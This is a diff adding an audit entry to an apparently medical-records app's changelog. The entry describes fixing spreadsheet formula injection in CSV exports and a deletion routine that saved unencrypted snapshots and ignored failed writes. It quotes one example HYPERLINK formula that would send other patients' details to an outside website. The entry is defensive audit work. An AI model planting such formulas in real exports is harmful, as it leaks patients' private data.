@@ -6,6 +6,25 @@ strong hypothesis, not a contract — the code is the source of truth).
 
 ---
 
+## 2026-09-24 — Full audit, part 8: spreadsheet exports and patient deletion
+
+- **CSV exports could carry a live spreadsheet formula.** A cell starting with
+  `=`, `+`, `-` or `@` runs as a formula when the file is opened in Excel or
+  Sheets; a patient name or complaint entered (or restored from a crafted
+  backup) as `=HYPERLINK("https://…"&A2,"open")` sends the neighbouring cells —
+  other patients' details — to a website on one click. Such cells are now
+  opened as text. Real numbers keep their sign: a sphere of `-3.00` is still a
+  number.
+- **Deleting a patient** wrote its safety snapshot to Downloads **unencrypted
+  even with record encryption on** (the restore already encrypted its copy),
+  and ignored whether the deletion writes worked — a refused write still
+  removed the patient, logged "deleted" and told other devices to delete it
+  too. Both fixed. Note: **there is currently no button anywhere in the app
+  that deletes a patient** — the function exists but nothing calls it. Whether
+  to add one (e.g. for erasure requests) is your call — see `NEEDS_REVIEW.md`.
+
+---
+
 ## 2026-09-24 — Full audit, part 7: restoring a backup, and saving a patient who has gone
 
 ### Restoring a backup could report success while failing
